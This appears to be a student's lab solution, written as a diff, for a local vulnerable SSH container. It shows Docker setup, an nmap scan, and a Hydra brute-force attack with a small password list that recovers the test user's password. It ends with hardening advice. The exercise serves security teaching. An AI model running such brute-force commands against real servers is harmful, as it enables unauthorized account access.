@@ -1,1 +1,80 @@
-resitev
+(root㉿kali)-[~]
+└─# sudo docker run -d -p 2222:22 --name dvws-ssh dvws
+
+ba3762a9addbd09b1880457a74a3d6566207560a3994d89d3e73627c059f7bec
+                                                                             
+┌──(root㉿kali)-[~]
+└─# docker ps
+CONTAINER ID   IMAGE     COMMAND               CREATED         STATUS         PORTS                                     NAMES
+ba3762a9addb   dvws      "/usr/sbin/sshd -D"   2 minutes ago   Up 2 minutes   0.0.0.0:2222->22/tcp, [::]:2222->22/tcp   dvws-ssh
+                                                                             
+┌──(root㉿kali)-[~]
+└─# 
+
+
+#Sucsesfully instaled updates and docker, then copied docker image from github and ran container locally.
+
+
+──(root㉿kali)-[~]
+└─# nmap -sS -sV -p 2222 localhost
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-22 10:32 EDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000056s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+#Using nmap we confirm port 2222 is open and running ubuntu
+
+
+                                                                             
+┌──(root㉿kali)-[~]
+└─# ssh testuser@localhost -p 2222
+The authenticity of host '[localhost]:2222 ([::1]:2222)' can't be established.
+ED25519 key fingerprint is: SHA256:eGDtdKlLUXrKAfitnfiHSp1qrINPYGE08SohNnA7eV4
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yess
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
+testuser@localhost's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+///deleted for visibility and readability
+
+testuser@ba3762a9addb:~$ 
+
+#I created a short password list and used Hydra to test whether the SSH password could be found by brute force.
+
+                                                                            
+┌──(root㉿kali)-[~]
+└─# echo -e "password\n123456\ntest123\nadmin" > passwords.txt
+                                                                             
+┌──(root㉿kali)-[~]
+└─# cat passwords.txt
+password
+123456
+test123
+admin
+                                                                             
+┌──(root㉿kali)-[~]
+└─# hydra -l testuser -P passwords.txt -s 2222 localhost ssh
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-22 10:37:02
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking ssh://localhost:2222/
+[2222][ssh] host: localhost   login: testuser   password: test123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-22 10:37:05
+                                                                             
+┌──(root㉿kali)-[~]
+└─# 
+
+
+The SSH server should be protected by public-private key authentication instead of passwords. Additional protection should include limiting failed login attempts, blocking repeated attackers, using a firewall, disabling root login, and allowing access only from trusted users or IP addresses.
+If a very strong password is used, Hydra will usually not find it with a small password list. This makes brute-force attacks much less effective and much harder to succeed.
